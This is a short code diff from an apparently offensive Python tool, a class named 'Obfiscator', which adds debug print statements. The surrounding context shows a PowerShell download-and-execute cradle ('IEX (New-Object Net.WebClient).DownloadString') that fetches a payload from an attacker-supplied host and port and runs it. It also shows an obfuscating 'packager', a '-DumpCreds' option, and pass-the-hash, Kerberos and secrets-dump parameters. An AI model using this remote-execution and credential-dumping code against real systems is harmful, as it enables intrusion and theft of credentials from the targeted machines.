@@ -103,12 +103,15 @@ class Obfiscator:
 
     def executor(self):
         # Invoke a PowerShell Script Directly
+        print("Running Executor") #DEBUG
         if "-DumpCreds" not in self.argument:
             text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         else:
             text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
+        print(self.command) #DEBUG
+        print(self.unprotected_command) #DEBUG
 
     def downloader(self):
         # Download String Directly
@@ -373,7 +376,8 @@ Create Pasteable Double Encoded Script:
 [*] This execution script is double encoded.
 '''
     
-    print(unprotected_command, usr, pwd, dom, hash, aes, share, no_output, kerberos)
+    print(unprotected_command, usr, pwd, dom, hash, aes, share, no_output, kerberos)#DEBUG
+    print(command, usr, pwd, dom, hash, aes, share, no_output, kerberos)#DEBUG
 
     if method and sam_dump:
         sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
